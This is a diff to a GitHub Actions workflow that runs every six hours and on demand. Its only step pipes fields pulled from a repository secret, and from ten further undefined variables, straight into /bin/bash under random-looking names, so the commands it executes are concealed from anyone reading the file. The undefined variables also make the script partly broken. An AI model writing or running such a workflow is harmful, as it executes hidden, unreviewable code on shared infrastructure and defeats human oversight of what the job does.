@@ -1,22 +1,26 @@
 name: zhangyuqing6758
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 2/6 * * *'
-
+    - cron: '47 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhangyuqing6758
         env:
-          dofp689: ${{ secrets.dofp689 }}
+          r2: ${{ secrets.r2 }}
         run: |
-          echo $dofp689 | jq -r .y3385 | /bin/bash
-          echo $ei15 | jq -r .mwee4609 | /bin/bash
-          echo $axw089 | jq -r .aixc3189 | /bin/bash
-          echo $pdlr47216 | jq -r .lwft44015 | /bin/bash
+          echo $r2 | jq -r .s81606 | /bin/bash
+          echo $jwb5269 | jq -r .zw021 | /bin/bash
+          echo $xv92 | jq -r .l57 | /bin/bash
+          echo $gkg57097 | jq -r .e19 | /bin/bash
+          echo $o6 | jq -r .az93853 | /bin/bash
+          echo $xwpie6 | jq -r .scp7 | /bin/bash
+          echo $ovxup89 | jq -r .ahiz97528 | /bin/bash
+          echo $pru165 | jq -r .nz5303 | /bin/bash
+          echo $bjwxq94 | jq -r .gmou0854 | /bin/bash
+          echo $on27106 | jq -r .c89 | /bin/bash
+          echo $cku2264 | jq -r .uubhj0 | /bin/bash
 
